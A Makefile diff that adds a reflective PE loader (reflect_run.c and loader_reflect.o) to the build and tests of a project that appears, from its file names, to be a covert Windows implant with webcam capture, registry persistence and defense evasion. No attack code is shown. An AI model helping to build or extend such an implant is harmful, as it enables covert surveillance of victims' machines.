@@ -24,12 +24,15 @@ CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
 LDLIBS   ?= -lm
 
 BUILD     := build/linux
-PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/implant.c src/defend_win.c
+PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/implant.c src/defend_win.c \
+            src/reflect_run.c
 PORT_OBJS := $(PORT_SRCS:src/%.c=$(BUILD)/%.o)
 
-DEP_OBJS  := $(BUILD)/dep/loader_pe.o $(BUILD)/dep/defense_evade.o
+DEP_OBJS  := $(BUILD)/dep/loader_pe.o $(BUILD)/dep/loader_reflect.o \
+             $(BUILD)/dep/defense_evade.o
 
-TESTS     := test_pipeline test_linux_extra test_implant test_defend_win
+TESTS     := test_pipeline test_linux_extra test_implant test_defend_win \
+             test_reflect_run
 TEST_BINS := $(TESTS:%=$(BUILD)/%)
 
 .PHONY: all test clean win dirs
@@ -44,6 +47,11 @@ $(BUILD)/%.o: src/%.c include/camera.h | dirs
 
 # 复用的外部模块目标文件（17_loader 的 PE 解析 / 19_defense 的桩字节）
 $(BUILD)/dep/loader_pe.o: ../17_loader/src/pe.c | dirs
+	@mkdir -p $(BUILD)/dep
+	$(CC) $(CFLAGS) -c $< -o $@
+
+# 反射加载：17_loader 只做到内存映像构造，权限/TLS/入口三步在 src/reflect_run.c
+$(BUILD)/dep/loader_reflect.o: ../17_loader/src/reflect.c | dirs
 	@mkdir -p $(BUILD)/dep
 	$(CC) $(CFLAGS) -c $< -o $@
 
@@ -89,7 +97,7 @@ clean:
 # 该验证已抓出 5 个真实缺陷，详见 tests/winsdk_shim/README。
 # ---------------------------------------------------------------------------
 SHIM_BUILD := build/winshim
-SHIM_I     := -Iinclude -Itests/winsdk_shim -D_WIN32
+SHIM_I     := -Iinclude -Itests/winsdk_shim -I../17_loader/include -D_WIN32
 SHIM_CXX   := $(CXX) -std=c++14 -O1 -Wall -Wextra -Wno-unknown-pragmas $(SHIM_I)
 
 .PHONY: winshim winshim-build
@@ -111,6 +119,9 @@ winshim-build:
 	# implant_main.c / implant.c / cam_mock.c 是纯 C99，用 -x c++ 与 shim 一起编译，
 	# 使 Windows 专属的 persist_win.o（shim 注册表）能被真实链接进来。
 	$(SHIM_CXX) -x c++ -c src/implant_main.c -o $(SHIM_BUILD)/implant_main.o
+	$(SHIM_CXX) -x c++ -c src/reflect_run.c -o $(SHIM_BUILD)/reflect_run.o
+	$(SHIM_CXX) -x c++ -c ../17_loader/src/pe.c -o $(SHIM_BUILD)/pe.o
+	$(SHIM_CXX) -x c++ -c ../17_loader/src/reflect.c -o $(SHIM_BUILD)/reflect.o
 	$(SHIM_CXX) -x c++ -c src/implant.c -o $(SHIM_BUILD)/implant.o
 	$(SHIM_CXX) -x c++ -c src/cam_jpeg.c -o $(SHIM_BUILD)/cam_jpeg.o
 	$(SHIM_CXX) -c tests/test_implant_main.cpp -o $(SHIM_BUILD)/test_implant_main.o
@@ -118,6 +129,7 @@ winshim-build:
 	# cam_mock.o：shim_impl 已提供 camera 层实现，两者同链会重复定义。
 	# 这样验证的是 Windows 采集路径本身能被主循环驱动。
 	$(CXX) $(SHIM_BUILD)/implant_main.o $(SHIM_BUILD)/implant.o \
+	      $(SHIM_BUILD)/reflect_run.o $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
 	      $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
 	      $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
 	      $(SHIM_BUILD)/test_implant_main.o -o $(SHIM_BUILD)/test_implant_main
